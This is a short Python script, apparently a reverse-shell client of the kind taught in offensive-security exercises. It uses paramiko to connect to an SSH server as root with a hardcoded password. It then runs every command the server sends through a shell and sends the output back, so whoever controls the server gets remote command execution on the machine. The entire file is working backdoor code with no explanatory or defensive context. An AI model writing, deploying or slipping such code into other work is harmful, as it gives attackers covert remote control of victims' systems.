import paramiko
import threading
import subprocess
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('localhost',port=9000, username='root', password='toor')
chan = client.get_transport().open_session()
chan.send('Hey i am connected :)')
print(chan.recv(1024))

while True:
    command = chan.recv(1024)
    print("Executing this -->" + str(command))
    try:
        proc = subprocess.check_output(command, shell=True)
        chan.send(proc)
    except Exception as e:
        chan.send(str(e))


client.close()
